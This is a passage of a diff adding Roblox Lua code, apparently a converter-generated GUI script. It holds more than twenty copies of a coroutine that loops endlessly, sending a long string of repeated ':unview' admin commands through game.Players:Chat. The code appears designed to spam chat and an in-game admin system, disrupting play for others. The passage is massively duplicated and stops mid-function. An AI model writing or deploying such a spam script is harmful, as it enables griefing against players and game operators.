+		game.Players:Chat(":unview |!wait 1.3 |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview")
+	end
+	
+end
+coroutine.wrap(YIYSZI_fake_script)()
+local function OJKOPE_fake_script() -- Frame.dadmin 
+	local script = Instance.new('LocalScript', Frame)
+
+	
+	
+	while task.wait() do
+		game.Players:Chat(":unview |!wait 1.3 |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview")
+	end
+	
+end
+coroutine.wrap(OJKOPE_fake_script)()
+local function BYWJ_fake_script() -- Frame.dadmin 
+	local script = Instance.new('LocalScript', Frame)
+
+	
+	
+	while task.wait() do
+		game.Players:Chat(":unview |!wait 1.3 |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview")
+	end
+	
+end
+coroutine.wrap(BYWJ_fake_script)()
+local function TLKD_fake_script() -- Frame.dadmin 
+	local script = Instance.new('LocalScript', Frame)
+
+	
+	
+	while task.wait() do
+		game.Players:Chat(":unview |!wait 1.3 |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview")
+	end
+	
+end
+coroutine.wrap(TLKD_fake_script)()
+local function PCMVZEE_fake_script() -- Frame.dadmin 
+	local script = Instance.new('LocalScript', Frame)
+
+	
+	
+	while task.wait() do
+		game.Players:Chat(":unview |!wait 1.3 |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview")
+	end
+	
+end
+coroutine.wrap(PCMVZEE_fake_script)()
+local function FFDYD_fake_script() -- Frame.dadmin 
+	local script = Instance.new('LocalScript', Frame)
+
+	
+	
+	while task.wait() do
+		game.Players:Chat(":unview |!wait 1.3 |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview")
+	end
+	
+end
+coroutine.wrap(FFDYD_fake_script)()
+local function JOGIWSA_fake_script() -- Frame.dadmin 
+	local script = Instance.new('LocalScript', Frame)
+
+	
+	
+	while task.wait() do
+		game.Players:Chat(":unview |!wait 1.3 |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview")
+	end
+	
+end
+coroutine.wrap(JOGIWSA_fake_script)()
+local function SAHONV_fake_script() -- Frame.dadmin 
+	local script = Instance.new('LocalScript', Frame)
+
+	
+	
+	while task.wait() do
+		game.Players:Chat(":unview |!wait 1.3 |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview")
+	end
+	
+end
+coroutine.wrap(SAHONV_fake_script)()
+local function IWSX_fake_script() -- Frame.dadmin 
+	local script = Instance.new('LocalScript', Frame)
+
+	
+	
+	while task.wait() do
+		game.Players:Chat(":unview |!wait 1.3 |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview")
+	end
+	
+end
+coroutine.wrap(IWSX_fake_script)()
+local function ERRJAHJ_fake_script() -- Frame.dadmin 
+	local script = Instance.new('LocalScript', Frame)
+
+	
+	
+	while task.wait() do
+		game.Players:Chat(":unview |!wait 1.3 |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview")
+	end
+	
+end
+coroutine.wrap(ERRJAHJ_fake_script)()
+local function OBBKSPO_fake_script() -- Frame.dadmin 
+	local script = Instance.new('LocalScript', Frame)
+
+	
+	
+	while task.wait() do
+		game.Players:Chat(":unview |!wait 1.3 |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview")
+	end
+	
+end
+coroutine.wrap(OBBKSPO_fake_script)()
+local function PLRUBIT_fake_script() -- Frame.dadmin 
+	local script = Instance.new('LocalScript', Frame)
+
+	
+	
+	while task.wait() do
+		game.Players:Chat(":unview |!wait 1.3 |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview")
+	end
+	
+end
+coroutine.wrap(PLRUBIT_fake_script)()
+local function DCGHJZ_fake_script() -- Frame.dadmin 
+	local script = Instance.new('LocalScript', Frame)
+
+	
+	
+	while task.wait() do
+		game.Players:Chat(":unview |!wait 1.3 |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview")
+	end
+	
+end
+coroutine.wrap(DCGHJZ_fake_script)()
+local function AHLLUU_fake_script() -- Frame.dadmin 
+	local script = Instance.new('LocalScript', Frame)
+
+	
+	
+	while task.wait() do
+		game.Players:Chat(":unview |!wait 1.3 |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview")
+	end
+	
+end
+coroutine.wrap(AHLLUU_fake_script)()
+local function PJET_fake_script() -- Frame.dadmin 
+	local script = Instance.new('LocalScript', Frame)
+
+	
+	
+	while task.wait() do
+		game.Players:Chat(":unview |!wait 1.3 |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview")
+	end
+	
+end
+coroutine.wrap(PJET_fake_script)()
+local function GIFXPEA_fake_script() -- Frame.dadmin 
+	local script = Instance.new('LocalScript', Frame)
+
+	
+	
+	while task.wait() do
+		game.Players:Chat(":unview |!wait 1.3 |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview")
+	end
+	
+end
+coroutine.wrap(GIFXPEA_fake_script)()
+local function CWUS_fake_script() -- Frame.dadmin 
+	local script = Instance.new('LocalScript', Frame)
+
+	
+	
+	while task.wait() do
+		game.Players:Chat(":unview |!wait 1.3 |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview")
+	end
+	
+end
+coroutine.wrap(CWUS_fake_script)()
+local function ZCYWZKK_fake_script() -- Frame.dadmin 
+	local script = Instance.new('LocalScript', Frame)
+
+	
+	
+	while task.wait() do
+		game.Players:Chat(":unview |!wait 1.3 |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview")
+	end
+	
+end
+coroutine.wrap(ZCYWZKK_fake_script)()
+local function EUWEGZ_fake_script() -- Frame.dadmin 
+	local script = Instance.new('LocalScript', Frame)
+
+	
+	
+	while task.wait() do
+		game.Players:Chat(":unview |!wait 1.3 |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview")
+	end
+	
+end
+coroutine.wrap(EUWEGZ_fake_script)()
+local function XRROC_fake_script() -- Frame.dadmin 
+	local script = Instance.new('LocalScript', Frame)
+
+	
+	
+	while task.wait() do
+		game.Players:Chat(":unview |!wait 1.3 |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview")
+	end
+	
+end
+coroutine.wrap(XRROC_fake_script)()
+local function SFYKL_fake_script() -- Frame.dadmin 
+	local script = Instance.new('LocalScript', Frame)
+
+	
+	
+	while task.wait() do
+		game.Players:Chat(":unview |!wait 1.3 |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview")
+	end
+	
+end
+coroutine.wrap(SFYKL_fake_script)()
+local function WJZI_fake_script() -- Frame.dadmin 
+	local script = Instance.new('LocalScript', Frame)
+
+	
+	
+	while task.wait() do
+		game.Players:Chat(":unview |!wait 1.3 |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview")
+	end
+	
+end
+coroutine.wrap(WJZI_fake_script)()
+local function TYCJCNL_fake_script() -- Frame.dadmin 
+	local script = Instance.new('LocalScript', Frame)
+
+	
+	
+	while task.wait() do
